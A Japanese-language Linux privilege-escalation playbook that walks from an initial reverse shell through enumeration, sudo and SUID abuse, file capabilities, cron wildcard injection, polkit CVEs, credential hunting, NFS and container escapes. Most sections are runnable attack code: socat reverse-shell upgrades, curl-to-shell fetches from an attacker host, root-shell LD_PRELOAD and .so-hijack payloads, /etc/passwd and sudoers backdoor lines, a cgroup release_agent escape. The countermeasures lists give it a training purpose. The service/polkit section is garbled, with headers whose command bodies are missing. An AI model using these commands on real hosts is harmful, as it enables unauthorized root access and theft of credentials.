01Foothold Triage初動トリアージ

shell を取った直後の 2〜3 分で確定させるべき項目がある。ここを飛ばして自動列挙ツールを走らせると、ツールが動かない理由(noexec / インタプリタ不在 / TTY なし)を後から潰す羽目になる。順序は tty 安定化 → 自分の権限 → OS 情報 → 実行可能領域、が実務的に最短。

TTY 安定化

reverse shell 直後は job control も tab 補完も効かず、su / ssh / sudo がパスワード入力で必ず失敗する。ここを先に対処する。

bash
# 1) pty を割り当てる (python3 が最優先、なければ順に落とす)
python3 -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null          # python 不在時の定番
perl -e 'exec "/bin/bash";'
# busybox しかない極小環境
busybox sh

# 2) ここで Ctrl-Z して attacker 側に戻る
stty raw -echo; fg
# 3) shell 側に戻ったら端末情報を渡す (行が折り返さない / clear が使えるようになる)
export TERM=xterm-256color SHELL=/bin/bash
stty rows <ROWS> cols <COLS>    # attacker 側の stty size の値をそのまま

# socat を両側に置けるなら最初から完全な pty が取れる (最も安定)
# attacker: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
# victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
notestty raw -echo; fg を実行した直後の画面は何も表示されないことが多い。Enter を 1 回叩けばプロンプトが戻る。ここで慌てて Ctrl-C を押すと元の shell ごと落ちる。

自分の権限と OS 情報

bash
id; whoami; groups
uname -a; cat /etc/os-release; arch
hostname; hostname -f
cat /proc/version                       # gcc バージョン → exploit のビルド互換性判断に使える

# 所属グループだけで即座に昇格できる場合がある (下表)
id | grep -oE 'docker|lxd|lxc|disk|adm|sudo|wheel|shadow|video|kvm'

# 他ユーザとログイン状況
cat /etc/passwd | grep -vE 'nologin|false'
w; last -n 20; ls -la /home

書込・実行可能領域の確定

exploit をコンパイルする・ツールを落とす前に、どこが書けてどこが実行できるかを確定させる。/tmp が noexec の環境は珍しくない。

bash
# mount option を先に見る (noexec / nosuid / ro)
mount | column -t | grep -E 'noexec|nosuid|/tmp|/dev/shm|/home|/var'
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS

# 実際に実行できるか試す (option を見るより確実)
for d in /tmp /dev/shm /var/tmp /run/user/$(id -u) $HOME; do
  printf '#!/bin/sh\necho ok' > $d/.x 2>/dev/null && chmod +x $d/.x 2>/dev/null \
    && echo "$d: $($d/.x 2>&1)"; rm -f $d/.x
done

# ビルド環境の有無
which gcc cc clang make python3 python perl ruby php curl wget nc socat 2>/dev/null
warn全領域が noexec の場合でも手詰まりではない。(a) ELF を /lib64/ld-linux-x86-64.so.2 ./binary で loader 経由起動する、(b) memfd_create にファイルを載せて /proc/self/fd/N から実行する、(c) そもそもインタプリタ (python / perl / bash) は noexec の影響を受けないのでスクリプトに書き換える、の 3 択がある。(c) が最も確実。

ネットワーク位置

bash
ip -c a; ip route
ss -tulpn                               # localhost bind のみのサービスが昇格経路になりやすい
ss -tulpn | grep -E '127\.0\.0\.1|::1'
cat /etc/hosts; cat /etc/resolv.conf
arp -a 2>/dev/null || ip neigh

127.0.0.1 にしか bind していない service (MySQL / Redis / Jenkins / 内部 API) は外から触れないぶん認証が緩いことが多く、s07 の主要な狙い目になる。到達手段は lateral-movement s10 の pivot を使う。

要点 / key takeaways
  • tty 安定化を先にやらないと su / sudo が必ず失敗し、原因の切り分けに時間を浪費する
  • グループ所属は id 一発で分かるうえ docker / lxd / disk はほぼ即 root。列挙ツールより先に見る
  • noexec は mount option を読むより実際に実行して確かめるほうが速く確実

02Enumeration列挙

自動列挙ツールは見落としの保険であって一次手段ではない。出力の 9 割は雑音で、赤色が付いていても外れが多い。s01 の手動確認で見当がついているときは、該当箇所だけを手で掘るほうが速い。逆に完全に手がかりがない場合と、engagement 終盤の取りこぼし確認には有効。

ツール比較

tool得意実行時間の目安痕跡・注意
linpeas.sh網羅性が最も高い。cap / sudo / cron / cred / CVE を一括1〜5 分出力が膨大。プロセス生成が非常に多く EDR/auditd で目立つ
lse.sh (linux-smart-enumeration)レベル制御 (-l0/-l1/-l2) で雑音を段階的に増やせる30 秒〜2 分まず -l1。linpeas より読みやすい
pspy64他ツールでは絶対に見えない — 実行中の cron / 短命プロセスの引数常駐 (5〜10 分は回す)root 不要で /proc を polling。CPU を食う
LinEnum.sh軽量・古典的。出力が素直30 秒更新が止まって久しく新しい CVE は拾わない
linux-exploit-suggester-2kernel バージョン → 候補 CVE数秒偽陽性が非常に多い。distro backport を見ない — s11
unix-privesc-checkパーミッション網羅チェック1〜3 分古いが SUID / 書込可能設定ファイルの洗い出しは堅実

実行パターン

bash
# ディスクに落とさずメモリ経由で実行 (痕跡最小、ただし egress 必要)
curl -sL http://<LHOST>/linpeas.sh | sh
wget -qO- http://<LHOST>/linpeas.sh | sh

# 色付きのままログに残す → attacker 側で less -R して読む
./linpeas.sh -a 2>&1 | tee linpeas.log     # -a: 全チェック (時間はかかる)
./linpeas.sh -q -N                         # -q: banner 省略, -N: 色なし。grep/tee 用

# lse は段階的に
./lse.sh -l1 -c -i  # -c: 色なし, -i: 非対話, -l1: 昇格に有効な情報のみ。まずここ
./lse.sh -l2 -c -i  # -l2: 全情報を dump (かなり長い)

# pspy は「放置して待つ」のが正しい使い方
./pspy64 -pf -i 1000        # -p: プロセス, -f: ファイル event, -i: 1s 間隔
./pspy64 -r /home -r /etc   # 監視対象ディレクトリを絞る

転送手段 (HTTP / SMB / base64 / in-memory) の詳細は File Transfer 巻。

pspy でしか取れないもの

静的な列挙では、「1 分ごとに root が動かしているスクリプト」は crontab が読めない限り見えない。/etc/crontab や /etc/cron.d は誰でも読めるが、/var/spool/cron/crontabs/root は読めない。pspy はここを埋める。

bash
# pspy 出力の読み方 — UID=0 の行だけを追う
./pspy64 -pf | grep 'UID=0'

# 典型的な当たり:
# UID=0 PID=1234 | /bin/bash /opt/scripts/backup.sh        → script が書込可能か確認
# UID=0 PID=1235 | tar czf /backup/x.tgz /var/www/*         → wildcard injection (s06)
# UID=0 PID=1236 | mysql -u root -pS3cr3t                    → 引数に平文パスワード
# UID=0 PID=1237 | /usr/bin/python /opt/app/run.py           → import 可能な module 名を探す
noteプロセス引数に平文パスワードが乗るのは Linux 側で頻出する。ps aux は「その瞬間」しか見えないため、1 秒未満で終わる cron のパスワード引数は pspy でしか捕まらない。CTF に限らず実環境のバックアップスクリプトで日常的に起きている。

手動クイックスイープ

ツールが落とせない・実行できない場合の最小セット。この 8 行で経路の 7 割は見当がつく。

bash
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*/ 2>/dev/null
ss -tulpn | grep -E '127\.0\.0\.1|::1'
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run)' | head -40
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ 2>/dev/null
find / -name '*.sh' -writable -type f 2>/dev/null | grep -vE "^$HOME|^/proc"
防御 / countermeasures
  • auditd で /tmp /dev/shm 配下からの execve を記録する。列挙スクリプトの実行はここでほぼ確実に引っかかる
  • linpeas は短時間に数百〜数千のプロセスを生成する。プロセス生成レートの異常値は EDR / Falco の単純な閾値ルールで検知できる
  • /proc の hidepid=2 mount option で他ユーザのプロセス情報を隠すと pspy の有効性が大きく落ちる
  • cron ジョブでの認証情報は引数渡しをやめ、mode 600 の設定ファイル (~/.my.cnf 等) から読ませる
要点 / key takeaways
  • 自動ツールは保険。s01 で見当がついているなら手で掘るほうが速い
  • pspy は静的列挙の死角 (root の cron・短命プロセスの引数) を埋める唯一の手段。5〜10 分は放置する
  • linpeas の赤色は偽陽性が多い。裏取りせずに時間を使わない

03sudo Misconfigurationsudo 設定不備

最も高頻度で、最も静か。sudo -l が何かを返した時点で、まず GTFOBins を引く。sudo 経由の実行は監査ログに残るが root への昇格自体は正規機能なので、単独では検知されにくい。

sudo -l の読解

bash
sudo -l          # パスワードを聞かれる場合、既知パスワードがなければ NOPASSWD 行だけが希望

# 出力の読み方:
# (root) NOPASSWD: /usr/bin/find      → GTFOBins find: sudo find . -exec /bin/sh \; -quit
# (ALL : ALL) ALL                     → sudo su - で即終了 (要パスワード)
# (root) NOPASSWD: /opt/backup.sh     → スクリプトが書込可能なら中身を書き換える
# env_keep+=LD_PRELOAD               → 下の LD_PRELOAD 経路 (これは強力)
# !env_reset / SETENV                 → 環境変数を持ち込める = 危険

GTFOBins パターン (sudo 経由)

bash
# 代表例。https://gtfobins.github.io で許可された binary 名を引く
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo less /etc/profile          # less 内で !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'
sudo env /bin/sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo python3 -c 'import os;os.system("/bin/sh")'
sudo -u#-1 /bin/bash            # CVE-2019-14287: Runas に ALL, !root があっても uid -1 → 0

LD_PRELOAD / LD_LIBRARY_PATH

env_keep に LD_PRELOAD または LD_LIBRARY_PATH が残っていれば、許可されている binary が何であっても任意コードが root で走る。GTFOBins に載っていない binary でも通る、汎用性の高い経路。

c
// shell.c — コンパイルして LD_PRELOAD で読ませる
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
# env_keep+=LD_PRELOAD がある場合 (許可 binary は何でもよい):
sudo LD_PRELOAD=/tmp/shell.so <ANY_ALLOWED_BINARY>

# env_keep+=LD_LIBRARY_PATH の場合 — 許可 binary が依存する .so を偽装
ldd $(which <ALLOWED_BINARY>)          # どの lib を読むか確認
gcc -o /tmp/libcrypt.so.1 -shared -fPIC hijack.c   # 読まれる名前で用意
sudo LD_LIBRARY_PATH=/tmp <ALLOWED_BINARY>

sudoers に一切ルールが無くても成立する CVE がある。sudo --version でバージョンを確認する。

sudo token 再利用

対象ユーザが直近で sudo を成功させていれば、/run/sudo/ts/<user> にタイムスタンプトークンが残る。同一ユーザの別プロセスを取れているなら、gdb でそのプロセスに ptrace してトークン時刻を書き換え、パスワードなしで sudo を通せる (要 kernel.yama.ptrace_scope=0)。

防御 / countermeasures
  • sudoers から env_keep の LD_PRELOAD / LD_LIBRARY_PATH を排除。既定の env_reset を維持する
  • NOPASSWD で許可する binary は GTFOBins に載っていないものだけに限定。shell 脱出可能な binary (find/vim/awk/tar/less…) を渡さない
  • sudo を 1.9.17p1 以上へ。--chroot/-R は deprecated。使っていないなら明示的に無効化
  • kernel.yama.ptrace_scope=1 以上で sudo token の ptrace 再利用を封じる
  • auditd で sudo の execve と /run/sudo/ts への書込を監視
要点 / key takeaways
  • sudo -l が何か返したら反射的に GTFOBins。shell 脱出の可否がすべて
  • LD_PRELOAD が env_keep に残っていれば許可 binary が何であっても勝ち
  • CVE-2025-32463 は sudoers ルールが空でも刺さる。1.9.14〜1.9.17 は即確認

04SUID / SGIDSUID / SGID バイナリ

SUID bit の付いた binary は実行時に所有者(多くは root)の権限を得る。手順は「列挙 → 既知 binary は GTFOBins → 非標準 binary は個別解析」。

列挙

bash
# SUID
find / -perm -4000 -type f 2>/dev/null
# SGID
find / -perm -2000 -type f 2>/dev/null
# 両方 + 所有者・サイズ表示 (非標準を目視で拾う)
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

# 「標準の SUID 集合」を引き算して非標準だけ残すのが実務的
# 見慣れない名前 / /opt /home /usr/local 配下 / 自作っぽい binary が当たり
noteディストリ標準の SUID (passwd, su, sudo, mount, umount, ping, pkexec, newgrp, chsh, chfn, gpasswd) は既知 CVE がない限り素通りする。pkexec だけは例外で CVE-2021-4034 (PwnKit) を必ず確認 — s07。

既知 binary の GTFOBins パターン

bash
# SUID 版は -p でカレント権限を維持するのがポイント
./bash -p                              # SUID bash なら一発
./find . -exec /bin/sh -p \; -quit
./nmap --interactive                   # 旧 nmap (2.02-5.21) の対話モード
./vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
./env /bin/sh -p
./cp --help                            # cp は GTFOBins で /etc/shadow 上書き等の技あり

# 読み書き系 SUID は shell が取れなくても /etc/passwd に root ユーザを追記できる
echo 'r00t:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash' | ./tee -a /etc/passwd

共有ライブラリ hijack

非標準 SUID binary が書込可能な .so を読む、または存在しない .so を探しに行く場合、そこに悪意ある .so を置けば root で実行される。GTFOBins に無い binary への汎用アプローチ。

bash
# 1) SUID binary が読む .so を洗い出す
ldd /path/to/suid_binary
# 2) strace / ltrace で「探して見つからなかった .so」を拾う (これが狙い目)
strace /path/to/suid_binary 2>&1 | grep -E 'open.*\.so.*ENOENT|No such'
# 3) RUNPATH/RPATH に書込可能ディレクトリがないか
readelf -d /path/to/suid_binary | grep -E 'RPATH|RUNPATH'
objdump -p /path/to/suid_binary | grep -E 'RPATH|RUNPATH'
c
// 見つからなかった .so 名で用意。constructor が root で走る
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
// gcc -shared -fPIC -o /writable/path/missing.so hijack.c

PATH 相対参照の hijack

SUID binary が絶対パスなしで別コマンドを呼ぶ(system("service …") のような実装)場合、PATH を差し替えて偽コマンドを掴ませる。strings で相対コマンド名を探す。

bash
strings /path/to/suid_binary | grep -E '^[a-z_-]+$'   # 呼ばれていそうなコマンド名
# 例: binary が "service" を相対で呼ぶ場合
echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service
PATH=/tmp:$PATH /path/to/suid_binary
防御 / countermeasures
  • SUID 集合を最小化。標準セット以外を棚卸しし、不要な bit を chmod u-s で除去 (hardening と対で管理)
  • ユーザ書込可能な filesystem を nosuid で mount。/home /tmp /var/tmp /dev/shm は特に
  • 自作 SUID は絶対パスでコマンド呼び出しし、secure_getenv を使い、動的リンクを避ける (static build)
  • AIDE / integrity monitoring で SUID bit の新規付与を検知する
要点 / key takeaways
  • 標準 SUID は引き算。/opt /home /usr/local 配下と見慣れない名前が本命
  • GTFOBins に無い binary は ldd/strace/readelf で .so hijack か PATH hijack に持ち込む
  • shell が取れない読み書き SUID でも /etc/passwd 追記で勝てる

05Capabilitiesファイル capability

capability は SUID の粒度を細かくした仕組みだが、特定の cap は事実上 root と等価。SUID 列挙で何も出なくても capability で抜けることがあるため、必ず別途 getcap -r / を回す。

列挙と致命的な cap

bash
getcap -r / 2>/dev/null
# プロセスに付与された cap も確認
cat /proc/self/status | grep Cap
capsh --decode=<CAP_HEX>          # CapEff の hex を人間可読に
capability悪用root 等価性
cap_setuidプロセスの uid を 0 に実質 root
cap_dac_read_searchDAC 読取無視 → /etc/shadow 読取hash 経由で root
cap_dac_overrideDAC 書込無視 → /etc/passwd /etc/shadow 改竄実質 root
cap_sys_adminmount 等の広範な操作。多くのサブ機能を包含実質 root
cap_sys_ptrace任意プロセスに ptrace → root プロセスへ inject実質 root
cap_sys_module任意 kernel module ロード実質 root
cap_chown / cap_fowner所有者・パーミッション変更間接 root

悪用パターン

bash
# cap_setuid が python に付いている定番
# getcap → /usr/bin/python3.x = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid on perl
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_read_search — GTFOBins に cap 別ページあり。tar/gdb 等で任意読取
# 例: cap_dac_read_search+ep な tar で shadow を吸い出す
./tar cvf /tmp/s.tar /etc/shadow && tar xf /tmp/s.tar -O

# cap_dac_override on vim → shadow/passwd を直接編集
./vim /etc/passwd

# cap_sys_ptrace — root プロセスに shellcode inject (要同一/隣接権限の対象)
# gdb -p <root_pid> で call system("...") を叩く古典
noteGTFOBins は各 binary に「Capabilities」専用のセクションを持っている。getcap でヒットした binary 名を GTFOBins で引き、Sudo でも SUID でもなく Capabilities タブを見ること。+ep が付いていれば大抵そのまま刺さる。
防御 / countermeasures
  • ファイル capability を棚卸し。cap_setuid cap_dac_* cap_sys_admin cap_sys_ptrace cap_sys_module をインタプリタや汎用ツールに付けない
  • どうしても必要な場合は専用の小さな wrapper binary に限定し、汎用 binary (python/perl/tar/gdb) には付与しない
  • AIDE で getcap -r / の出力を baseline 化し、新規付与を検知
要点 / key takeaways
  • SUID がゼロでも getcap -r / は別途必ず回す
  • python/perl への cap_setuid+ep は一行で root。cap_dac_* は shadow 経由
  • GTFOBins は Sudo/SUID とは別に Capabilities タブがある

06Scheduled Executioncron / timer / PATH

root が定期実行するものに割り込む。書込可能なスクリプト・PATH 汚染・wildcard injection の 3 系統。pspy (s02) で「何が動いているか」を掴んでから狙う。

cron 列挙

bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
cat /etc/cron.d/*
crontab -l 2>/dev/null                 # 自分の crontab
ls -la /var/spool/cron/crontabs/ 2>/dev/null   # 通常 root しか読めない → pspy で補完
systemctl list-timers --all           # cron ではなく systemd timer のことも

# 走っているスクリプトのうち書込可能なものを直接探す
grep -rE '[0-9*]+ .*sh|/opt/|/home/' /etc/cron* 2>/dev/null
find /etc/cron* -writable 2>/dev/null

書込可能スクリプトの上書き

bash
# root cron が /opt/backup.sh を回していて、それが書込可能なら
ls -la /opt/backup.sh
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /opt/backup.sh
# 次回実行を待つ → SUID bash が落ちる
/tmp/rootbash -p

PATH 汚染

/etc/crontab の PATH= 行が /home/user など書込可能ディレクトリを含み、cron ジョブが絶対パスなしでコマンドを呼ぶ場合、そのコマンド名で偽物を置く。

bash
head /etc/crontab       # PATH= に書込可能な dir が先頭にないか
# 例: PATH=/home/user:/usr/bin ... で cron が "backup" を相対で呼ぶ
cat > /home/user/backup <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
EOF
chmod +x /home/user/backup

wildcard injection

cron が tar/rsync/chown/chmod を * 付きで、かつ自分が書けるディレクトリ内で実行しているとき、ファイル名を option として解釈させる古典。pspy で tar czf … * のような行を見たら成立を疑う。

bash
# root cron: cd /var/www && tar czf /backup/www.tgz *
# --checkpoint-action で任意コマンド実行に化ける
cd /var/www
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# tar が * を展開すると上の2ファイルが option になり shell.sh が root 実行される

# rsync -e パターン / chown --reference パターンも同系統。GTFOBins 参照
notewildcard injection の成立条件は「cron が書込可能ディレクトリ内で * を使う」こと。ファイル名で option を注入するので、tar なら --checkpoint、chown/chmod なら --reference、rsync なら -e が入口になる。
防御 / countermeasures
  • cron スクリプトとその親ディレクトリを root 所有・非書込に。find で world/group writable な cron 資産を定期監査
  • cron の PATH は絶対パスの安全なディレクトリのみ。ジョブ内のコマンドは絶対パスで呼ぶ
  • アーカイブ処理は tar czf out.tgz -- ./* のように -- で option 終端を明示するか、find … -print0 | tar --null -T - で * 展開を避ける
  • auditd で cron が起動するプロセスツリーを監視。想定外の子プロセスを検知
要点 / key takeaways
  • pspy で「root の定期実行」を掴んでから狙う。crontab が読めない前提で動く
  • 書込可能スクリプト > PATH 汚染 > wildcard injection の順で当たりやすい
  • wildcard は * + 書込可能ディレクトリ + option を取る binary の三点セット

07Service / polkitサービス・polkit・IPC

書込可能な systemd unit、ローカル待受サービス、そして polkit / D-Bus 経由の権限昇格。ここは「正規の特権デーモンを騙す」系統で、kernel exploit より安定して刺さることが多い。

書込可能 systemd unit

bash
# 書込可能な unit / service ファイルを探す

systemctl list-units --type=service --state=running
# unit が指す ExecStart のバイナリ/スクリプトが書込可能なパターンも多い

[Service]

# systemctl daemon-reload && systemctl start <svc> が撃てるか、reboot cron 待ち

PwnKit — CVE-2021-4034 (pkexec)

# 公開 exploit (C 単体で完結、依存なし): github.com/ly4k/PwnKit
# 実行は 1 バイナリ。in-memory 版もある

PAM + udisks chain — CVE-2025-6018 / CVE-2025-6019

bash

# CVE-2025-6019 単体でも allow_active を既に持っていれば root まで届く
# (ローカルの物理/GUI セッション、または CVE-2025-6018 で allow_active を得た後)
# PoC: github.com/MichaelVenturella/CVE-2025-6018-6019-PoC

systemd-coredump 情報漏洩 — CVE-2025-4598

直接 root ではないが、SUID プロセスの core dump から /etc/shadow の内容や SSH host key を吸い出す TOCTOU。RHEL 9/10・Fedora が対象。SUID プロセスをクラッシュさせ、同 PID を非 SUID プロセスで置換して coredump 読取権を得る。s08 の credential 経路と接続する。

ローカル待受サービス

s01 で見つけた 127.0.0.1 bind のサービスは、root で動いていれば昇格経路。Redis (CONFIG SET dir で cron/authorized_keys 書込)、Jenkins/CI (script console)、内部 DB (UDF)、古い管理 API などが典型。

bash
ss -tulpn | grep 127.0.0.1

> config set dbfilename authorized_keys

防御 / countermeasures
  • unit ファイルと ExecStart 対象を root 所有・非書込に。systemctl edit の drop-in 権限も監査
  • polkit / udisks / libblockdev をパッチ最新へ。使わない udisks2 は無効化。PwnKit 対策として pkexec の SUID を落とす選択肢も
  • CVE-2025-4598 の緩和は fs.suid_dumpable=0。core dump をそもそも無効化 (ulimit -c 0 / coredump.conf) するのが堅い
  • ローカルサービスに認証を必須化。Redis は requirepass + protected-mode、非 root ユーザで起動
  • auditd で unit ファイル書込・pkexec 実行・udisks の mount 呼び出しを監視
要点 / key takeaways
  • 特権デーモンを騙す系統は kernel exploit より安定。まずこちらを尽くす
  • PwnKit (CVE-2021-4034) は古い環境なら最優先。設定不要・ほぼ全 distro
  • 2025 の udisks chain と coredump は distro デフォルト構成に刺さる。バージョン確認を習慣化

08Credential Hunting認証材料の探索

昇格は exploit だけではない。どこかに落ちている root のパスワード・SSH 鍵・API トークンを拾うほうが速く静かなことが多い。取得した material の横展開は lateral-movement へ引き継ぐ。

ファイルベース

bash
# history 系 — 平文パスワードが sudo/mysql/ssh 引数に残りがち
cat ~/.bash_history ~/.zsh_history 2>/dev/null
find /home /root -name '*_history' -readable 2>/dev/null -exec cat {} +

# SSH 鍵 (自分が読めるもの全部)
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
find / -name 'authorized_keys' 2>/dev/null    # どの鍵が通るかの手がかり

# 設定ファイルに埋まった資格情報
grep -rniE 'password|passwd|secret|api[_-]?key|token|BEGIN.*PRIVATE' \
  /var/www /opt /home /etc 2>/dev/null | grep -vE 'Binary|\.min\.' | head -60
find / -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' \
  -o -name '.my.cnf' -o -name '.pgpass' -o -name 'credentials' 2>/dev/null

# cloud metadata / IAM (クラウド上のホストなら)
cat ~/.aws/credentials ~/.config/gcloud/* 2>/dev/null
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

/etc/shadow が読めた場合

bash
# passwd と shadow を結合して john 形式へ
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# hash 種別を確認 ($6=sha512crypt, $y=yescrypt, $2=bcrypt …)
head -1 /etc/shadow

# hashcat: sha512crypt=1800, yescrypt=不可(john), bcrypt=3200, md5crypt=500
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --rules=best64
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
noteyescrypt ($y$、Debian 11+/Ubuntu 22.04+ のデフォルト) は hashcat が未対応で john 側でのみ crack する。sha512crypt ($6$) は hashcat mode 1800。種別を先に確定してからツールを選ぶ。crack 詳細は ad-compromise の hash 節も参照。

メモリ・プロセス経由

bash
# 実行中プロセスの引数に平文 (ps は瞬間、常時監視は pspy)
ps auxww | grep -iE 'pass|pwd|token|-p ' | grep -v grep

# 環境変数に埋まった秘密 (自分が読めるプロセスのみ)
for p in /proc/[0-9]*/environ; do tr '\0' '\n' < $p 2>/dev/null | grep -iE 'PASS|TOKEN|KEY|SECRET'; done

# GNOME keyring / SSH agent socket の乗っ取り (同ユーザ別 session)
ls -la /tmp/ssh-*/agent.* 2>/dev/null
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN ssh-add -l    # 生きている鍵があれば lateral
防御 / countermeasures
  • 秘密情報をファイル・環境変数・コマンド引数に置かない。secret manager / systemd credentials を使う
  • HISTFILE を機微操作で無効化、あるいは監査ログ側に一本化。world-readable な history を作らない
  • SSH 秘密鍵は passphrase 必須 + mode 600。.env / wp-config.php 等は最小パーミッションに
  • クラウドは IMDSv2 強制 + IAM 最小権限。169.254.169.254 への到達をアプリ層で制限
要点 / key takeaways
  • exploit より先に「落ちている資格情報」を探すほうが速く静か
  • shadow の hash は種別を先に確定。yescrypt は john、sha512crypt は hashcat 1800
  • ssh-agent socket と /proc/*/environ は同ユーザ横取りの盲点

09Filesystem / Mountファイルシステム・マウント

書込可能な認証ファイル、NFS の no_root_squash、fstab の穴。パーミッションのミスだけで root になれる、最も「設定ミス」寄りの経路。

書込可能な認証ファイル

bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ /etc/group
find /etc -writable -type f 2>/dev/null

# /etc/passwd が書けるなら root ユーザを追記 (x なし = パスワード無しの古典 or hash 埋め込み)
openssl passwd -1 -salt hacked pass123           # $1$ md5crypt を生成
echo 'hacked:$1$hacked$XXXXXXXX:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked                                          # pass123

# /etc/sudoers.d/ に書けるなら NOPASSWD ルールを足す
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/pwn

# /etc/shadow が書けるなら既知 hash で root の行を置換
note現代の Linux は /etc/passwd の第二フィールドが x で shadow を参照する。ここに直接 hash を書けば shadow を触らずに済む。x を空にして「パスワード無し root」を作る古典技は、PermitEmptyPasswords 等の制約で通らないことがあるため hash 埋め込みのほうが確実。

NFS no_root_squash

export 側に no_root_squash が付いていると、client 側の root が server 上でも root として書ける。攻撃者が root な別マシン(自分の Kali 等)からその share を mount し、SUID binary を置けば target 側で root shell になる。

bash
# target 側で export 設定を確認
cat /etc/exports 2>/dev/null
showmount -e <TARGET>          # attacker 側から

# no_root_squash な share を attacker(root) で mount
mkdir /mnt/nfs; mount -o rw,vers=3 <TARGET>:/share /mnt/nfs

# SUID root shell を置く (attacker が root なので所有者 root で書ける)
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash

# target 側の非特権 shell から (share が target からも見える前提)
/share/rootbash -p

その他 mount 起因

bash
cat /etc/fstab                         # 平文パスワード・credential ファイル指定・nosuid 欠落
mount | grep -vE 'nosuid|noexec'    # SUID 有効な mount を洗う
lsblk; blkid                           # 未 mount のパーティション (別ユーザの / を含むことも)

# disk グループなら raw device を直接読む
debugfs /dev/sda1                       # -w で書込。/etc/shadow を cat 可能
防御 / countermeasures
  • /etc/passwd /etc/shadow /etc/sudoers* /etc/group のパーミッションを AIDE で baseline 化し、書込可能化を検知
  • NFS export は root_squash (既定) を維持。no_root_squash は原則使わない。必要なら sec=krb5 + IP 制限
  • ユーザ書込可能な mount は nosuid,nodev。fstab に平文 credential を書かず credentials= ファイル (mode 600) を使う
  • disk グループへの所属を厳しく管理。raw device 読取は shadow 相当
要点 / key takeaways
  • 認証ファイルの書込可否は 1 行で確認でき、通れば最速。sudoers.d 追記が最も静か
  • NFS no_root_squash は attacker が root な別ホストを持っていれば SUID 設置で勝ち
  • disk グループ = shadow 読取。mount option の nosuid 欠落も見る

10Container Escapeコンテナ脱出

コンテナ内 root、あるいは host 上の docker/lxd グループ所属からの脱出。s01 のグループ確認で見当がついていれば、ここは最短経路の一つ。

コンテナ判定

bash
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
cat /proc/self/status | grep -i cap    # CapEff が広い = privileged 疑い
capsh --print
mount | grep -E 'docker|overlay'
env | grep -i 'KUBERNETES\|DOCKER'

docker.sock / docker グループ

docker socket に触れる = host root 等価。docker グループ所属、またはコンテナ内に socket が mount されている場合に成立。

bash
ls -la /var/run/docker.sock 2>/dev/null
id | grep -o docker

# host の / をコンテナに mount して chroot → host root
docker run -v /:/host --rm -it alpine chroot /host /bin/bash

# socket に直接触れる場合 (docker cli なし・API 直叩き)
# /var/run/docker.sock 経由で privileged コンテナを作り host fs を mount

# コンテナ内から socket が見える場合も同じ
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh

privileged コンテナ / cap_sys_admin

bash
# --privileged または cap_sys_admin があれば host device を mount できる
fdisk -l                               # host のディスクが見える
mkdir /hostfs; mount /dev/sda1 /hostfs # host / を直接 mount
chroot /hostfs bash

# 古典の cgroup release_agent 脱出 (privileged 前提)
# notify_on_release + release_agent に host 側実行させる shell を仕込む
mkdir /tmp/cg; mount -t cgroup -o rdma cgroup /tmp/cg; mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)   # overlay の upperdir=host パス
echo "$host_path/cmd" > /tmp/cg/release_agent
printf '#!/bin/sh\ncp /bin/bash %s/bash; chmod +s %s/bash' $host_path $host_path > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"   # 空 cgroup へ→終了時に release_agent が host 側で発火

lxd / lxc グループ

bash
# lxd グループ = host root。privileged container に host / を mount
id | grep -o lxd
# alpine image を取り込み、security.privileged=true で host / を disk mount
lxc image import ./alpine.tar.gz --alias pwn 2>/dev/null || lxd init --auto
lxc init pwn c1 -c security.privileged=true
lxc config device add c1 host disk source=/ path=/mnt/root recursive=true
lxc start c1
lxc exec c1 /bin/sh
